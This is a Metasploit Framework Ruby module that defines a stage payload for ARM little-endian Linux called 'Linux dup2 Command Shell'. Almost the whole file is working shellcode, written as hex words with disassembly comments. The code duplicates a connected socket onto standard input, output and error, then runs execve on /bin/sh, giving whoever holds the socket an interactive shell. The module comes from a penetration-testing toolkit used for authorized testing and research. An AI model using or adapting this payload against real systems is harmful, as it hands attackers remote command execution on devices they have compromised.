##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux dup2 Command Shell',
			'Description'   => 'dup2 socket in r12, then execve',
			'Author'        => 'nemo <nemo[at]felinemenace.org>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_ARMLE,
			'Session'       => Msf::Sessions::CommandShell,
			'Stage'         =>
				{
					'Payload' =>
					[
						0xe3a0703f,     # mov     r7, #63 ; 0x3f
						0xe3a01003,     # mov     r1, #3
						0xe1a0000c,     # mov     r0, ip
						0xe2411001,     # sub     r1, r1, #1
						0xef000000,     # svc     0x00000000
						0xe3510001,     # cmp     r1, #1
						0xaafffffa,     # bge     805c <up>
						0xe3a0700b,     # mov     r7, #11
						0xe28f0018,     # add     r0, pc, #24
						0xe24dd018,     # sub     sp, sp, #24
						0xe50d0014,     # str     r0, [sp, #-20]
						0xe3a02000,     # mov     r2, #0
						0xe50d2010,     # str     r2, [sp, #-16]
						0xe24d1014,     # sub     r1, sp, #20
						0xe1a02001,     # mov     r2, r1
						0xef000000,     # svc     0x00000000
						0x6e69622f,     # .word   0x6e69622f
						0x0068732f      # .word   0x0068732f
					].pack("V*")
				}
			))
	end

end
